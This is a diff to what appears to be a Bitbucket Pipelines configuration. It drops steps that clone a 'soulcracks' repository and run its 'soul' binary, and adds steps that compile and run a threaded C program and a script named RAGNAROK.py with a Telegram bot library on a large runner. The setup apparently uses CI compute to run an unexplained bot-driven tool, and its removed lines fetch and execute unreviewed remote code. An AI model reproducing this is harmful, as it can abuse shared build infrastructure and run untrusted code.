@@ -1,18 +1,16 @@
-image: python:3.9
+image: python:latest  # Latest Python version use karega
 
 pipelines:
   default:
     - step:
-        name: Build and Run
+        name: Install Libraries, Check CPU & Run Code
         size: 8x
-        caches:
-          - pip
         script:
           - apt-get update && apt-get install -y gcc libpthread-stubs0-dev
-          - pip install telebot pymongo aiohttp
-          - git clone https://github.com/Soulhonvxb5091/soulcracks
-          - mv soul.py $HOME
-          - cd soulcracks
-          - mv soul $HOME & cd
-          - chmod +x *
-          - chmod +x soul && timeout 3600 python3 soul.py
+          - pip install --upgrade pip  # Ensure latest pip version
+          - pip install flask telebot pymongo aiohttp
+          - lscpu  # Check CPU information
+          - gcc moul.c -o moul -lpthread  # Compile C program
+          - chmod +x moul  # Make compiled file executable
+          - ./moul  # Run the compiled C program
+          - python3 RAGNAROK.py  # Run Python script
